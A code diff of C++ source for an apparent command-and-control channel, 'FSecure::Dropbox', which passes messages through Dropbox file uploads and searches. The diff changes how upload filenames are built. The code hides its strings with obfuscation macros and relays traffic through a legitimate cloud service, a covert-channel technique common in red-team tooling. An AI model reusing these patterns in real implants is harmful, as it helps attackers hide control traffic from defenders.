@@ -42,9 +42,14 @@ void FSecure::Dropbox::SetToken(std::string const& token)
 	this->m_Token = token;
 }
 
-void FSecure::Dropbox::WriteMessageToFile(std::string const& filename, ByteView data)
+void FSecure::Dropbox::WriteMessageToFile(std::string const& direction, ByteView data)
 {
 	std::string url = OBF_STR("https://content.dropboxapi.com/2/files/upload");
+
+	///Create a filename thats prefixed with message direction and suffixed 
+	// with more granular timestamp for querying later
+	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
+	std::string filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
 
 	json j;
 	j[OBF("path")] = OBF("/") + this->m_Channel + OBF("/") + filename;
@@ -125,7 +130,7 @@ std::map<std::string, std::string> FSecure::Dropbox::GetMessagesByDirection(std:
 			search_options[OBF("path")] = OBF("/") + this->m_Channel;
 			search_options[OBF("filename_only")] = true;
 			json j;
-			j[OBF("query")] = OBF("^") + direction;
+			j[OBF("query")] = OBF("^") + direction;   // regexp
 			j[OBF("options")] = search_options;
 
 			response = SendJsonRequest(url, j);
